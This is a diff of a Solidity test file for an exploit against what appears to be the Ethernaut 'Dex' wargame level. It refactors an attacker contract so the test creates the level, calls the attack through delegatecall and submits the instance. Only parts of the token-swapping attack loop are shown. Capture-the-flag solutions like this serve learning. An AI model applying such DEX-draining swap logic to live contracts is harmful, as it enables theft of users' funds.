@@ -13,16 +13,7 @@ interface IDex {
 }
 
 contract DexAttacker {
-  IDex internal dex;
-  address public challengeAddress;
-
-  constructor(address _challengeFactory) {
-    challengeAddress = utils.createLevelInstance(_challengeFactory);
-    dex = IDex(challengeAddress);
-    dex.approve(challengeAddress, 100);
-  }
-
-  function attack() public {
+ function attack(IDex dex) public {
     address from = dex.token1();
     address to = dex.token2();
     address tmp; // textbook flipping of two variables
@@ -49,23 +40,25 @@ contract DexAttacker {
         to = tmp;
       }
     }
-
-    // see comment at testExploit()
-    utils.submitLevelInstance(challengeAddress);
   }
 }
 
 contract DexTest is Test {
+  address internal challengeAddress;
+  IDex internal dex;
   DexAttacker internal attackContract;
 
   function setUp() public {
-    // give the factory to the attacker, so it can get tokens assigned
-    attackContract = new DexAttacker(0xC084FC117324D7C628dBC41F17CAcAaF4765f49e);
+    challengeAddress = utils.createLevelInstance(0xC084FC117324D7C628dBC41F17CAcAaF4765f49e);
+    dex = IDex(challengeAddress);
+    dex.approve(challengeAddress, 100);
+    attackContract = new DexAttacker();
   }
 
   function testExploit() public {
-    // the contract needs to invoke submitLevelInstance
-    // as they invoked the factory
-    attackContract.attack();
+    (bool success,) = address(attackContract).delegatecall(abi.encodeWithSignature("attack(address)", address(dex)));
+    require(success);
+
+    utils.submitLevelInstance(challengeAddress);
   }
 }
